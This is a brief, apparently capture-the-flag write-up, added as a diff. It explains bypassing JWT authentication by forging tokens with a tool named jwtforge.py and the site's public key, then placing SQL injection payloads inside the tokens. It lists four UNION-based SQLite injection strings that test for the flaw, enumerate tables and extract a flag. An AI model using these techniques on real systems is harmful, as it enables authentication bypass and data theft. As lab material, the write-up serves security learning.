@@ -1,0 +1,21 @@
+so...
+
+after looking through the code you can see JWT is used.
+This is a JSON web token.
+
+you can confuse the authentication by using the jwt_forge.py
+tool which i think uses the public key from the site and
+a different encoding which results in a valid token.
+
+use jwtforge.py as such:
+python3 jwtforge.py $(saved token) "injection goes here" > forged_token_that_you_pass_to_burp
+
+using this method, you can do a sql injection.
+
+make different injections and make tokens out of them and send it using burp once logged in as a legit user.
+e.g
+
+test' and 1=2 UNION SELECT 1,2,3 -- -                                                   | This will check if its vulnerable
+test' and 1=2 UNION SELECT 1,sqlite_version(),3 -- -                                    | This will show you the version of sqlite
+test' and 1=2 UNION SELECT 1,group_concat(tbl_name),3 from sqlite_master -- -           | This will show all tables
+test' and 1=2 UNION SELECT 1,group_concat(top_secret_flaag),3 from flag_storage -- -    | This shows the flag. NOT a typo in flaag!
